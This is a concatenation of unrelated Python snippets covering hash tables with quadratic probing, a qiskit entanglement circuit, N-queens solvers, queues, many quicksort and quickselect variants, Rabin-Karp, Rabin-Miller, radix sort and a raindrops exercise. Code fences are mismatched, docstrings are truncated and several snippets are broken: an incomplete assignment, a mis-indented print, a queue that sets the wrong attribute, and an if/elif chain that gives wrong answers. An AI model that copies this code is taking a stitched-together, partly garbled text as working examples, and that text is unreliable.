        Basic Hash Table example with open addressing using Quadratic Probing
    """
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def _colision_resolution(self, key, data=None):
        i = 1
        new_key = self.hash_function(key + i*i)

        while self.values[new_key] is not None \
                and self.values[new_key] != key:
            i += 1
            new_key = self.hash_function(key + i*i) if not \
                self.balanced_factor() >= self.lim_charge else None

            if new_key is None:
                break

        return new_key

#!/usr/bin/env python3```


```py
Build a quantum circuit with pair or group of qubits to perform
quantum entanglement.
Quantum entanglement is a phenomenon observed at the quantum scale
where entangled particles stay connected (in some sense) so that
the actions performed on one of the particles affects the other,
no matter the distance between two particles.```


```py

import qiskit


def quantum_entanglement(qubits: int = 2) -> qiskit.result.counts.Counts:
    """
    # >>> quantum_entanglement(2)
    # {'00': 500, '11': 500}
    #      ┌───┐     ┌─┐
    # q_0: ┤ H ├──■──┤M├───
    #      └───┘┌─┴─┐└╥┘┌─┐
    # q_1: ─────┤ X ├─╫─┤M├
    #           └───┘ ║ └╥┘
    # c: 2/═══════════╩══╩═
    #                 0  1
    Args:
        qubits (int): number of quibits to use. Defaults to 2
    Returns:
        qiskit.result.counts.Counts: mapping of states to its counts
    """
    classical_bits = qubits

    # Using Aer's qasm_simulator
    simulator = qiskit.Aer.get_backend("qasm_simulator")

    # Creating a Quantum Circuit acting on the q register
    circuit = qiskit.QuantumCircuit(qubits, classical_bits)

    # Adding a H gate on qubit 0 (now q0 in superposition)
    circuit.h(0)

    for i in range(1, qubits):
        # Adding CX (CNOT) gate
        circuit.cx(i - 1, i)

    # Mapping the quantum measurement to the classical bits
    circuit.measure(list(range(qubits)), list(range(classical_bits)))

    # Now measuring any one qubit would affect other qubits to collapse
    # their super position and have same state as the measured one.

    # Executing the circuit on the qasm simulator
    job = qiskit.execute(circuit, simulator, shots=1000)

    return job.result().get_counts(circuit)


if __name__ == "__main__":
    print(f"Total count for various states are: {quantum_entanglement(3)}")

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from z3 import *

# We know each queen must be in a different row.
# So, we represent each queen by a single integer: the column position
Q = [Int("Q_%i" % (i + 1)) for i in range(8)]

# Each queen is in a column {1, ... 8 }
val_c = [And(1 <= Q[i], Q[i] <= 8) for i in range(8)]

# At most one queen per column
col_c = [Distinct(Q)]

# Diagonal constraint
diag_c = [
    If(i == j, True, And(Q[i] - Q[j] != i - j, Q[i] - Q[j] != j - i))
    for i in range(8)
    for j in range(i)
]

solve(val_c + col_c + diag_c)
````

````py
Queens Problem

You have an N by N board. Write a function that, given N, returns the number of possible arrangements
of the board where N queens can be placed on the board without threatening each other,
i.e. no two queens share the same row, column, or diagonal.

=========================================
Backtracking solution.
    Time Complexity:    O(N!) (but I think it's much faster!)
    Space Complexity:   O(N)
* There are much faster solutions, like O(N^2)```


```py


############
# Solution #
############


def place_n_queens(n):
    columns = [False for i in range(n)]
    order = []

    return backtracking(columns, order)


def backtracking(columns, order):
    # columns and order are references, no extra memory for those arrays (they are just pointers)
    n = len(columns)

    if len(order) == n:
        return 1

    total = 0

    for i in range(n):
        if (not columns[i]) and check_diagonals(order, i):
            order.append(i)
            columns[i] = True
            total += backtracking(columns, order)
            # return to the old state
            columns[i] = False
            del order[-1]

    return total


def check_diagonals(order, pos):
    current_row = len(order)

    for i in range(current_row):
        if (i - order[i]) == (current_row - pos):
            return False
        if (i + order[i]) == (current_row + pos):
            return False

    return True


###########
# Testing #
###########

# Test 1
# Correct result => 1
print(place_n_queens(1))

# Test 2
# Correct result => 0
print(place_n_queens(2))

# Test 3
# Correct result => 0
print(place_n_queens(3))

# Test 4
# Correct result => 2
print(place_n_queens(4))

# Test 5
# Correct result => 10
print(place_n_queens(5))

# Test 6
# Correct result => 4
print(place_n_queens(6))

# Test 7
# Correct result => 40
print(place_n_queens(7))

# Test 8
# Correct result => 92
print(place_n_queens(8))

# Test 9
# Correct result => 352
print(place_n_queens(9))

# Test 10
# Correct result => 724
print(place_n_queens(10))

class Queue:
  def __init__(self):
    self.size = 0
    # what data structure should we
    # use to store queue elements?
    self.storage =

  def enqueue(self, item):
    pass

  def dequeue(self):
    pass

  def len(self):
    pass

# Implement the missing code, denoted by ellipses. You may not modify the pre-existing code.
# Implement a queue using two stacks.

# You are given an array of requests, where requests[i] can be "push <x>" or "pop". Return an array composed of the results of each "pop" operation that is performed.

# Example

# For requests = ["push 1", "push 2", "pop", "push 3", "pop"], the output should be
# queueOnStacks(requests) = [1, 2].

# After the first request, the queue is {1}; after the second it is {1, 2}. Then we do the third request, "pop", and add the first element of the queue 1 to the answer array. The queue becomes {2}. After the fourth request, the queue is {2, 3}. Then we perform "pop" again and add 2 to the answer array, and the queue becomes {3}.

# Input/Output

# [execution time limit] 4 seconds (py3)

# [input] array.string requests

# requests[i] can be "push <x>" or "pop". It is guaranteed that "pop" isn't applied to an empty queue.

# Guaranteed constraints:
# 1 ≤ requests.length ≤ 300,
# -1000 ≤ x ≤ 1000.

# [output] array.integer

# Return an array composed of the results of each "pop" operation that is performed.


class Stack:
    def __init__(self):
        self.items = []

    def isEmpty(self):
        return self.items == []

    def push(self, item):
        self.items.append(item)

    def pop(self):
        return self.items.pop()


def queueOnStacks(requests):
    left = Stack()
    right = Stack()

    def insert(x):
        left.push(x)

    def remove():
        if not left.isEmpty():
            right.push(left.items.pop(0))
            return right.pop()


    ans = []
    for request in requests:
        req = request.split(" ")
        if req[0] == 'push':
            insert(int(req[1]))
        else:
            ans.append(remove())
    return ans

  print(queueOnStacks(["push 1",
 "push 2",
 "pop",
 "push 3",
 "pop"]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFIFO Queue```


```py

#end_pymotw_header
import queue

q = queue.Queue()

for i in range(5):
    q.put(i)

while not q.empty():
    print(q.get(), end=' ')
print()

class LinkedListNode:
    def __init__(self, data):
        self.value = data
        self.next = None


class Queue:
    def __init__(self):
        self.head = None
        self.end = None

    def enqueue(self, value):  # insert at the end
        new_node = LinkedListNode(value)
        # is the list empty?
        if self.head is None and self.end is None:
            self.head = new_node
            self.end = new_node
        else:
            self.end.next = (
                new_node
            )  # creates the connection fron one node to the other
            self.tail = new_node  # this moves the arrow

    def dequeue(self):  # pop form the head
        # is the list empty:
        if self.head is None:
            return

        value = self.head.value
        # remove the node at the head and move the head
        self.head = self.head.next
        if self.head is None:
            # no more items
            self.tail = None
        return value


q = Queue()
q.enqueue(3)
q.enqueue(34)
q.enqueue(35)
q.enqueue(6)

print(q.tail.value)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLIFO Queue```


```py

#end_pymotw_header
import queue

q = queue.LifoQueue()

for i in range(5):
    q.put(i)

while not q.empty():
    print(q.get(), end=' ')
print()
````

```pyQueue represented by a Python list"""


class Queue:
    def __init__(self):
        self.entries = []
        self.length = 0
        self.front = 0

    def __str__(self):
        printed = "<" + str(self.entries)[1:-1] + ">"
        return printed

    """Enqueues {@code item}
    @param item
        item to enqueue"""

    def put(self, item):
        self.entries.append(item)
        self.length = self.length + 1

    """Dequeues {@code item}
    @requirement: |self.length| > 0
    @return dequeued
        item that was dequeued"""

    def get(self):
        self.length = self.length - 1
        dequeued = self.entries[self.front]
        # self.front-=1
        # self.entries = self.entries[self.front:]
        self.entries = self.entries[1:]
        return dequeued

    """Rotates the queue {@code rotation} times
    @param rotation
        number of times to rotate queue"""

    def rotate(self, rotation):
        for i in range(rotation):
            self.put(self.get())

    """Enqueues {@code item}
    @return item at front of self.entries"""

    def get_front(self):
        return self.entries[0]

    """Returns the length of this.entries"""

    def size(self):
        return self.length
```

````pyQueue represented by a pseudo stack (represented by a list with pop and append)"""


class Queue:
    def __init__(self):
        self.stack = []
        self.length = 0

    def __str__(self):
        printed = "<" + str(self.stack)[1:-1] + ">"
        return printed

    """Enqueues {@code item}
    @param item
        item to enqueue"""

    def put(self, item):
        self.stack.append(item)
        self.length = self.length + 1

    """Dequeues {@code item}
    @requirement: |self.length| > 0
    @return dequeued
        item that was dequeued"""

    def get(self):
        self.rotate(1)
        dequeued = self.stack[self.length - 1]
        self.stack = self.stack[:-1]
        self.rotate(self.length - 1)
        self.length = self.length - 1
        return dequeued

    """Rotates the queue {@code rotation} times
    @param rotation
        number of times to rotate queue"""

    def rotate(self, rotation):
        for i in range(rotation):
            temp = self.stack[0]
            self.stack = self.stack[1:]
            self.put(temp)
            self.length = self.length - 1

    """Reports item at the front of self
    @return item at front of self.stack"""

    def front(self):
        front = self.get()
        self.put(front)
        self.rotate(self.length - 1)
        return front

    """Returns the length of this.stack"""

    def size(self):
        return self.length

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyPriorityQueue```


```py

#end_pymotw_header
import functools
import queue
import threading


@functools.total_ordering
class Job:

    def __init__(self, priority, description):
        self.priority = priority
        self.description = description
        print('New job:', description)
        return

    def __eq__(self, other):
        try:
            return self.priority == other.priority
        except AttributeError:
            return NotImplemented

    def __lt__(self, other):
        try:
            return self.priority < other.priority
        except AttributeError:
            return NotImplemented


q = queue.PriorityQueue()

q.put(Job(3, 'Mid-level job'))
q.put(Job(10, 'Low-level job'))
q.put(Job(1, 'Important job'))


def process_job(q):
    while True:
        next_job = q.get()
        print('Processing job:', next_job.description)
        q.task_done()


workers = [
    threading.Thread(target=process_job, args=(q,)),
    threading.Thread(target=process_job, args=(q,)),
]
for w in workers:
    w.setDaemon(True)
    w.start()

q.join()

from random import randint


def quickSort(lst):
    # List of 0 or 1 items is already sorted
    if len(lst) <= 1:
        return lst
    else:
        # Pivot can be chosen randomly
        pivotIndex = randint(0, len(lst) - 1)
        pivot = lst[pivotIndex]
        # Elements lower than and greater than pivot
        lesser, greater = [], []

        for index in range(len(lst)):
            # Don't do anything if you're at the pivot
            if index == pivotIndex:
                pass
            else:
                # Sort elements into < pivot and >= pivot
                el = lst[index]
                if el < pivot:
                    lesser.append(el)
                else:
                    greater.append(el)

        # Sort lesser and greater, concatenate results
        return quickSort(lesser) + [pivot] + quickSort(greater)

class Solution:
    def quickSelect(self, nums, k):
        return self.helper(nums, 0, len(nums) - 1, k)

    def helper(self, nums, left, right, k):

        while True:
            pivot = left
            leftIdx = left + 1
            rightIdx = right
            while leftIdx <= rightIdx:
                if nums[leftIdx] > nums[pivot] and nums[rightIdx] < nums[pivot]:
                    nums[leftIdx], nums[rightIdx] = nums[rightIdx], nums[leftIdx]

                if nums[leftIdx] <= nums[pivot]:
                    leftIdx += 1
                if nums[rightIdx] >= nums[pivot]:
                    rightIdx -= 1
            nums[pivot], nums[rightIdx] = nums[rightIdx], nums[pivot]

            if rightIdx == k:
                return nums[rightIdx]
            elif k > rightIdx:
                left = rightIdx + 1
            else:
                right = rightIdx - 1


if __name__ == "__main__":
    nums = [3, 2, 3, 1, 2, 4, 5, 5, 6]
    k = 4
    print(Solution().quickSelect(nums, k))
````

````pyUtilities for driving Selenium interactively to develop tests.

These are not used in the tests themselves - rather, the developer writing tests
can use them to experiment with Selenium.```


```py
from selenium.webdriver import Firefox

from notebook.tests.selenium.utils import Notebook
from notebook.notebookapp import list_running_servers

class NoServerError(Exception):

    def __init__(self, message):
        self.message = message

def quick_driver(lab=False):
    """Quickly create a selenium driver pointing at an active noteboook server.

    Usage example:

        from notebook.tests.selenium.quick_selenium import quick_driver
        driver = quick_driver

    Note: you need to manually close the driver that opens with driver.quit()
    """
    try:
        server = list(list_running_servers())[0]
    except IndexError as e:
        raise NoServerError('You need a server running before you can run '
                            'this command') from e
    driver = Firefox()
    auth_url = '{url}?token={token}'.format(**server)
    driver.get(auth_url)

    # If this redirects us to a lab page and we don't want that;
    # then we need to redirect ourselves to the classic notebook view
    if driver.current_url.endswith('/lab') and not lab:
        driver.get(driver.current_url.rstrip('lab')+'tree')
    return driver


def quick_notebook():
    """Quickly create a new classic notebook in a selenium driver


    Usage example:

        from notebook.tests.selenium.quick_selenium import quick_notebook
        nb = quick_notebook()

    Note: you need to manually close the driver that opens with nb.browser.quit()
    """
    return Notebook.new_notebook(quick_driver())
````

````py
Author: OMKAR PATHAK
Created On: 31st July 2017

 - Best = Average = O(n log(n))
 - Worst = O(n ^ 2)```


```py
import inspect


def sort(_list):
    """
    quick_sort algorithm
    :param _list: list of integers to sort
    :return: sorted list
    """
    if len(_list) <= 1:
        return list(_list)
    pivot = _list[len(_list) // 2]
    left = [x for x in _list if x < pivot]
    middle = [x for x in _list if x == pivot]
    right = [x for x in _list if x > pivot]
    return sort(left) + middle + sort(right)


# TODO: Are these necessary?
def time_complexities():
    """
    Return information on functions
    time complexity
    :return: string
    """
    return """Best Case: O(nlogn), Average Case: O(nlogn), Worst Case: O(n ^ 2)"""


def get_code():
    """
    easily retrieve the source code
    of the sort function

    :return: source code
    """
    return inspect.getsource(sort)

def quick_sort_3partition(sorting: list, left: int, right: int) -> None:
    if right <= left:
        return
    a = i = left
    b = right
    pivot = sorting[left]
    while i <= b:
        if sorting[i] < pivot:
            sorting[a], sorting[i] = sorting[i], sorting[a]
            a += 1
            i += 1
        elif sorting[i] > pivot:
            sorting[b], sorting[i] = sorting[i], sorting[b]
            b -= 1
        else:
            i += 1
    quick_sort_3partition(sorting, left, a - 1)
    quick_sort_3partition(sorting, b + 1, right)


def three_way_radix_quicksort(sorting: list) -> list:
    """
    Three-way radix quicksort:
    https://en.wikipedia.org/wiki/Quicksort#Three-way_radix_quicksort
    First divide the list into three parts.
    Then recursively sort the "less than" and "greater than" partitions.

    >>> three_way_radix_quicksort([])
    []
    >>> three_way_radix_quicksort([1])
    [1]
    >>> three_way_radix_quicksort([-5, -2, 1, -2, 0, 1])
    [-5, -2, -2, 0, 1, 1]
    >>> three_way_radix_quicksort([1, 2, 5, 1, 2, 0, 0, 5, 2, -1])
    [-1, 0, 0, 1, 1, 2, 2, 2, 5, 5]
    """
    if len(sorting) <= 1:
        return sorting
    return (
        three_way_radix_quicksort([i for i in sorting if i < sorting[0]])
        + [i for i in sorting if i == sorting[0]]
        + three_way_radix_quicksort([i for i in sorting if i > sorting[0]])
    )


if __name__ == "__main__":
    import doctest

    doctest.testmod(verbose=True)

    user_input = input("Enter numbers separated by a comma:\n").strip()
    unsorted = [int(item) for item in user_input.split(",")]
    quick_sort_3partition(unsorted, 0, len(unsorted) - 1)
    print(unsorted)

from __future__ import print_function

def quick_sort_3partition(sorting, left, right):
    if right <= left:
        return
    a = i = left
    b = right
    pivot = sorting[left]
    while i <= b:
        if sorting[i] < pivot:
            sorting[a], sorting[i] = sorting[i], sorting[a]
            a += 1
            i += 1
        elif sorting[i] > pivot:
            sorting[b], sorting[i] = sorting[i], sorting[b]
            b -= 1
        else:
            i += 1
    quick_sort_3partition(sorting, left, a - 1)
    quick_sort_3partition(sorting, b + 1, right)

if __name__ == '__main__':
    try:
        raw_input          # Python 2
    except NameError:
        raw_input = input  # Python 3

    user_input = raw_input('Enter numbers separated by a comma:\n').strip()
    unsorted = [ int(item) for item in user_input.split(',') ]
    quick_sort_3partition(unsorted,0,len(unsorted)-1)
    print(unsorted)

from book import Book
# Divide a problem in to subproblems (of the same type)
# Solve the subproblems
# Combine the results of the subproblems
# to get the solution to the original problem

def quick_sort(data, low, high):
    # check base case
    # if low is greater than or equal to high
    if low >= high:
        # return the data
        return data
    # otherwise
    else:
        # divide
        pivot_index = low

    # for each element in sub list
    for i in range(low, high):
        # check if data at index is less than data at pivot index
        if data[i].genre < data[pivot_index].genre:
            # double swap to move smaller elements to the correct index
            # move current element to right of pivot
            temp = data[pivot_index + 1]
            data[pivot_index + 1] = data[i]
            data[i] = temp
            # swap the pivot with the element to its right
            temp = data[pivot_index]
            data[pivot_index] = data[pivot_index + 1]
            data[pivot_index + 1] = data[i]
            data[i] = temp

    # conqure
    # quick sort the left
    data = quick_sort(data, low, pivot_index)
    # quick sort the right
    data = quick_sort(data, pivot_index + 1, high)

    # return the data
    return data

b1 = Book('Food for thought', 'jon jones', 'food')
b2 = Book('My life in reality', 'don davis', 'life')
b3 = Book('Apples, how you like them?', 'stan simpson', 'food')
b4 = Book('Just Do It', 'shia le boeuf', 'inspirational')
b5 = Book('What is this code anyway', 'tom jones', 'programming')

books = [b1, b2, b3, b4, b5]

for b in books:
    print(b)

quick_sort(books, 0, 5)


print('----------------------------------------------------------')
for b in books:
    print(b)


# Divide a problem in to subproblems (of the same type)
# Solve the subproblems
# Combine the results of the subproblems
# to get the solution to the original problem

def quick_sort(data, low, high):
    # check base case
    # if low is greater than or equal to high
    if low >= high:
        # return the data
        return data
    # otherwise
    else:
        # divide
        pivot_index = low

    # for each element in sub list
    for i in range(low, high):
        # check if data at index is less than data at pivot index
        if data[i] < data[pivot_index]:
            # double swap to move smaller elements to the correct index
            # move current element to right of pivot
            temp = data[pivot_index + 1]
            data[pivot_index + 1] = data[i]
            data[i] = temp
            # swap the pivot with the element to its right
            temp = data[pivot_index]
            data[pivot_index] = data[pivot_index + 1]
            data[pivot_index + 1] = data[i]
            data[i] = temp

    # conqure
    # quick sort the left
    data = quick_sort(data, low, pivot_index)
    # quick sort the right
    data = quick_sort(data, pivot_index + 1, high)

    # return the data
    return data


lst = [8, 5, 6, 4, 3, 7, 9, 2, 1]
print(lst)
quick_sort(lst, 0, 9)
print('--------------------------')
print(lst)```


```py
ID: a44325d3-9846-4032-b443-04fd5a5ebddf
Python Algorithms, Page 123```


```py
from collections.abc import Sequence

from algorithms.partition import partition
from src.typehints import T


def quickselect(seq: Sequence[T], k: int) -> T:
    """Find the kth smallest item in a sequence."""
    low, pivot, high = partition(seq)
    low_len = len(low)
    if low_len == k:
        return pivot
    elif low_len < k:
        return quickselect(high, k - low_len - 1)
    else:
        return quickselect(low, k)

def partition(A, lo, hi):
    pivot = A[lo + (hi - lo) // 2]
    i = lo - 1
    j = hi + 1

    while True:

        i += 1
        while A[i] < pivot:
            i += 1

        j -= 1
        while A[j] > pivot:
            j -= 1

        if i >= j:
            return j
        A[i], A[j] = A[j], A[i]


def quicksort(A, lo, hi):
    if lo < hi:
        p = partition(A, lo, hi)
        quicksort(A, lo, p)
        quicksort(A, p + 1, hi)
    return A


if __name__ == "__main__":
    arr = [8, 3, 5, 1, 7, 2]
    quicksort(arr, 0, len(arr) - 1)
    #  >>> [1, 2, 3, 5, 7, 8]
````

````py
ID: 9f17b309-5ad5-4f13-81ac-814cdb8f3696
https://en.wikipedia.org/wiki/Quicksort
Grokking Algorithms, Page 60
Python Algorithms, Page 124

The partition function is split out (unlike in Grokking Algorithms) so it can be used in quickselect.
Add that to allowed.csv, also, to get the full algorithm.```


```py
from collections.abc import Sequence

from algorithms.partition import partition
from src.typehints import T


def quicksort(seq: Sequence[T]) -> list[T]:
    if len(seq) < 2:
        return list(seq)
    low, pivot, high = partition(seq)
    return quicksort(low) + [pivot] + quicksort(high)
````

````py
ID: 9f17b309-5ad5-4f13-81ac-814cdb8f3696
https://en.wikipedia.org/wiki/Quicksort
Grokking Algorithms, Page 60
Python Algorithms, Page 124

The partition function is split out (unlike in Grokking Algorithms) so it can be used in quickselect.
Add that to allowed.csv, also, to get the full algorithm.```


```py
from collections.abc import Sequence

from algorithms.partition import partition
from src.typehints import T


def quicksort(seq: Sequence[T]) -> list[T]:
    if len(seq) < 2:
        return list(seq)
    low, pivot, high = partition(seq)
    return quicksort(low) + [pivot] + quicksort(high)

def quicksort_equal_elements(s):
    '''Quicksort from finxter modified to add all elements equal to the pivot
    directly after the pivot, so that quicksort performs faster for cases
    where there are many identical elements in the array to be sorted (e.g.
    there are only 2 values for all elements, or 1 unique value in a large
    array, etc.)'''
    if len(s) < 2:
        return s
    else:
        # upgraded to work for sets with multiple identical numbers!
        return quicksort_equal_elements([x for x in s[1:] if x < s[0]]) \
               + [s[0]] + [x for x in s[1:] if x == s[0]] \
               + quicksort_equal_elements([x for x in s[1:] if x > s[0]])

import time


def A(s):
    if len(s) < 2:
        return s
    else:
        return (
            A([x for x in s[1:] if x < s[0]])
            + [s[0]]
            + A([x for x in s[1:] if x >= s[0]])
        )


# start = time.clock()
# test = [21, 4, 1, 3, 9, 20, 25, 6, 21, 14]
# print(A(test))
# end = time.clock()

# print(end-start)

test = [21, 4, 1, 3, 9, 20, 25, 6, 21, 14]
times = []

for i in range(1000):
    start = time.clock()
    A(test)
    end = time.clock()
    times.append(end - start)

average = sum(times) / len(times)
print(average)

# first install quote library using pip install quote then import it
from quote import quote
import random

try:
    print("Tell me the author or person name?")

    # taking the author/person name as input
    q_author = input()

    # getting the quotes
    quotes = quote(q_author)

    # selecting a random quote
    quote_no = random.randint(1, len(quotes))

    # displaying the quote with author name
    print("Author: ", quotes[quote_no]['author'])
    print("-->", quotes[quote_no]['quote'])

except Exception as e:
    pass



# '''
# Linked List hash table key/value pair
# '''
class LinkedPair:
    def __init__(self, key, value):
        self.key = key
        self.value = value
        self.next = None


# '''
# Fill this in

# Resizing hash table
# '''
class HashTable:
    def __init__(self, capacity):
        pass


# '''
# Research and implement the djb2 hash function
# '''
def hash(string, max):
    pass


# '''
# Fill this in.

# Hint: Used the LL to handle collisions
# '''
def hash_table_insert(hash_table, key, value):
    pass


# '''
# Fill this in.

# If you try to remove a value that isn't there, print a warning.
# '''
def hash_table_remove(hash_table, key):
    pass


# '''
# Fill this in.

# Should return None if the key is not found.
# '''
def hash_table_retrieve(hash_table, key):
    pass


# '''
# Fill this in
# '''
def hash_table_resize(hash_table):
    pass


def Testing():
    ht = HashTable(2)

    hash_table_insert(ht, "line_1", "Tiny hash table")
    hash_table_insert(ht, "line_2", "Filled beyond capacity")
    hash_table_insert(ht, "line_3", "Linked list saves the day!")

    print(hash_table_retrieve(ht, "line_1"))
    print(hash_table_retrieve(ht, "line_2"))
    print(hash_table_retrieve(ht, "line_3"))

    old_capacity = len(ht.storage)
    ht = hash_table_resize(ht)
    new_capacity = len(ht.storage)

    print("Resized hash table from " + str(old_capacity)
          + " to " + str(new_capacity) + ".")


Testing()

def rabin_karp(pattern, text):
    """

    The Rabin-Karp Algorithm for finding a pattern within a piece of text
    with complexity O(nm), most efficient when it is used with multiple patterns
    as it is able to check if any of a set of patterns match a section of text in o(1) given the precomputed hashes.

    This will be the simple version which only assumes one pattern is being searched for but it's not hard to modify

    1) Calculate pattern hash

    2) Step through the text one character at a time passing a window with the same length as the pattern
        calculating the hash of the text within the window compare it with the hash of the pattern. Only testing
        equality if the hashes match

    """
    p_len = len(pattern)
    p_hash = hash(pattern)

    for i in range(0, len(text) - (p_len - 1)):

        # written like this t
        text_hash = hash(text[i:i + p_len])
        if text_hash == p_hash and \
                text[i:i + p_len] == pattern:
            return True
    return False


if __name__ == '__main__':
    # Test 1)
    pattern = "abc1abc12"
    text1 = "alskfjaldsabc1abc1abc12k23adsfabcabc"
    text2 = "alskfjaldsk23adsfabcabc"
    assert rabin_karp(pattern, text1) and not rabin_karp(pattern, text2)

    # Test 2)
    pattern = "ABABX"
    text = "ABABZABABYABABX"
    assert rabin_karp(pattern, text)

    # Test 3)
    pattern = "AAAB"
    text = "ABAAAAAB"
    assert rabin_karp(pattern, text)

    # Test 4)
    pattern = "abcdabcy"
    text = "abcxabcdabxabcdabcdabcy"
    assert rabin_karp(pattern, text)

# Numbers of alphabet which we call base
alphabet_size = 256
# Modulus to hash a string
modulus = 1000003


def rabin_karp(pattern: str, text: str) -> bool:
    """
    The Rabin-Karp Algorithm for finding a pattern within a piece of text
    with complexity O(nm), most efficient when it is used with multiple patterns
    as it is able to check if any of a set of patterns match a section of text in o(1)
    given the precomputed hashes.

    This will be the simple version which only assumes one pattern is being searched
    for but it's not hard to modify

    1) Calculate pattern hash

    2) Step through the text one character at a time passing a window with the same
        length as the pattern
        calculating the hash of the text within the window compare it with the hash
        of the pattern. Only testing equality if the hashes match
    """
    p_len = len(pattern)
    t_len = len(text)
    if p_len > t_len:
        return False

    p_hash = 0
    text_hash = 0
    modulus_power = 1

    # Calculating the hash of pattern and substring of text
    for i in range(p_len):
        p_hash = (ord(pattern[i]) + p_hash * alphabet_size) % modulus
        text_hash = (ord(text[i]) + text_hash * alphabet_size) % modulus
        if i == p_len - 1:
            continue
        modulus_power = (modulus_power * alphabet_size) % modulus

    for i in range(0, t_len - p_len + 1):
        if text_hash == p_hash and text[i : i + p_len] == pattern:
            return True
        if i == t_len - p_len:
            continue
        # Calculate the https://en.wikipedia.org/wiki/Rolling_hash
        text_hash = (
            (text_hash - ord(text[i]) * modulus_power) * alphabet_size
            + ord(text[i + p_len])
        ) % modulus
    return False


def test_rabin_karp() -> None:
    """
    >>> test_rabin_karp()
    Success.
    """
    # Test 1)
    pattern = "abc1abc12"
    text1 = "alskfjaldsabc1abc1abc12k23adsfabcabc"
    text2 = "alskfjaldsk23adsfabcabc"
    assert rabin_karp(pattern, text1) and not rabin_karp(pattern, text2)

    # Test 2)
    pattern = "ABABX"
    text = "ABABZABABYABABX"
    assert rabin_karp(pattern, text)

    # Test 3)
    pattern = "AAAB"
    text = "ABAAAAAB"
    assert rabin_karp(pattern, text)

    # Test 4)
    pattern = "abcdabcy"
    text = "abcxabcdabxabcdabcdabcy"
    assert rabin_karp(pattern, text)

    # Test 5)
    pattern = "Lü"
    text = "Lüsai"
    assert rabin_karp(pattern, text)
    pattern = "Lue"
    assert not rabin_karp(pattern, text)
    print("Success.")


if __name__ == "__main__":
    test_rabin_karp()

from __future__ import print_function
# Primality Testing with the Rabin-Miller Algorithm

import random

def rabinMiller(num):
    s = num - 1
    t = 0

    while s % 2 == 0:
        s = s // 2
        t += 1

    for trials in range(5):
        a = random.randrange(2, num - 1)
        v = pow(a, s, num)
        if v != 1:
            i = 0
            while v != (num - 1):
                if i == t - 1:
                    return False
                else:
                    i = i + 1
                    v = (v ** 2) % num
    return True

def isPrime(num):
    if (num < 2):
        return False

    lowPrimes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59,
                 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127,
                 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191,
                 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257,
                 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331,
                 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401,
                 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467,
                 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563,
                 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631,
                 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709,
                 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797,
                 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877,
                 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967,
                 971, 977, 983, 991, 997]

    if num in lowPrimes:
        return True

    for prime in lowPrimes:
        if (num % prime) == 0:
            return False

    return rabinMiller(num)

def generateLargePrime(keysize = 1024):
    while True:
        num = random.randrange(2 ** (keysize - 1), 2 ** (keysize))
        if isPrime(num):
            return num

if __name__ == '__main__':
    num = generateLargePrime()
    print(('Prime number:', num))
    print(('isPrime:', isPrime(num)))

from math import pi


def radians(degree: float) -> float:
    """
    Coverts the given angle from degrees to radians
    https://en.wikipedia.org/wiki/Radian

    >>> radians(180)
    3.141592653589793
    >>> radians(92)
    1.6057029118347832
    >>> radians(274)
    4.782202150464463
    >>> radians(109.82)
    1.9167205845401725

    >>> from math import radians as math_radians
    >>> all(abs(radians(i)-math_radians(i)) <= 0.00000001  for i in range(-2, 361))
    True
    """

    return degree / (180 / pi)


if __name__ == "__main__":
    from doctest import testmod

    testmod()

def radixsort(lst):
  RADIX = 10
  maxLength = False
  tmp , placement = -1, 1

  while not maxLength:
    maxLength = True
    # declare and initialize buckets
    buckets = [list() for _ in range( RADIX )]

    # split lst between lists
    for i in lst:
      tmp = int((i / placement) % RADIX)
      buckets[tmp].append(i)

      if maxLength and tmp > 0:
        maxLength = False

    # empty lists into lst array
    a = 0
    for b in range( RADIX ):
      buck = buckets[b]
      for i in buck:
        lst[a] = i
        a += 1

    # move to next
    placement *= RADIX

# Given a number, write a function that converts that number into a string that contains "raindrop sounds" corresponding to certain potential factors. A factor is a number that evenly divides into another number, leaving no remainder. The simplest way to test if one number is a factor of another is to use the modulo operator.

# Here are the rules for csRaindrop. If the input number:

# has 3 as a factor, add "Pling" to the result.
# has 5 as a factor, add "Plang" to the result.
# has 7 as a factor, add "Plong" to the result.
# does not have any of 3, 5, or 7 as a factor, the result should be the digits of the input number.
# Examples:

# csRaindrops(28) -> "Plong"
# 28 has 7 as a factor, but not 3 or 5.
# csRaindrops(30) -> "PlingPlang"
# 30 has both 3 and 5 as factors, but not 7.
# csRaindrops(34) -> "34"
# 34 is not factored by 3, 5, or 7.
# [execution time limit] 4 seconds (py3)

# [input] integer number

# [output] string


def csRaindrops(number):
    output_string = ""
    has_3_factor = output_string + "Pling"
    if number % 3 == 0:
        output_string += "Pling"
    elif number % 5 == 0:
        output_string += "Plang"
    elif number % 7 == 0:
        output_string += "Plong"
    elif output_string is "":
        output_string += str(number)
    return output_string
````

````py
    pygments.styles.rainbow_dash
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    A bright and colorful syntax highlighting `theme`.

    .. _theme: http://sanssecours.github.io/Rainbow-Dash.tmbundle

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import (Comment, Error, Generic, Name, Number, Operator,
                            String, Text, Whitespace, Keyword)

BLUE_LIGHT = '#0080ff'
BLUE = '#2c5dcd'
GREEN = '#00cc66'
GREEN_LIGHT = '#ccffcc'
GREEN_NEON = '#00cc00'
GREY = '#aaaaaa'
